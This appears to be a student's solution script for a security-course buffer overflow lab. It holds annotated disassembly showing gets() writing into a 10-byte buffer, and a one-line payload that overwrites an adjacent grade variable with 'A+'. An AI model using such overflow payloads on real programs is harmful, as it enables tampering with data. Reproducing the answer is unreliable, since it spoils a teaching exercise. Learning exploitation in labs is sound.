'''
Buffer overflow happens because 
the name buffer is created to hold 10 bytes

Gets doesn't take in a length parameter
and instead will write x bytes of input into the
10 byte buffer it is passed... not good

0x0804887c <+0>:     push   %ebp
0x0804887d <+1>:     mov    %esp,%ebp
0x0804887f <+3>:     sub    $0x18,%esp
0x08048882 <+6>:     lea    -0xd(%ebp),%eax
0x08048885 <+9>:     movl   $0x6c696e,(%eax)
0x0804888b <+15>:    sub    $0xc,%esp
0x0804888e <+18>:    lea    -0x17(%ebp),%eax
0x08048891 <+21>:    push   %eax
0x08048892 <+22>:    call   0x804f3e0 <gets> ****
0x08048897 <+27>:    add    $0x10,%esp
0x0804889a <+30>:    sub    $0x4,%esp
0x0804889d <+33>:    lea    -0xd(%ebp),%eax
0x080488a0 <+36>:    push   %eax
0x080488a1 <+37>:    lea    -0x17(%ebp),%eax
0x080488a4 <+40>:    push   %eax
0x080488a5 <+41>:    push   $0x80bbce8
0x080488aa <+46>:    call   0x804ed60 <printf> ****
0x080488af <+51>:    add    $0x10,%esp
0x080488b2 <+54>:    sub    $0xc,%esp
0x080488b5 <+57>:    push   $0x0
0x080488b7 <+59>:    call   0x804e3b0 <exit> ****



grade allocated first (5 bytes), then name (10 bytes), so name sits above grade in 
the stack, meaning we can write down into it



'''
uniqname = 'hirochri'

#Uniqname 8 chars + 2 of padding + grade
print(uniqname + "\x00"*2 + "A+")
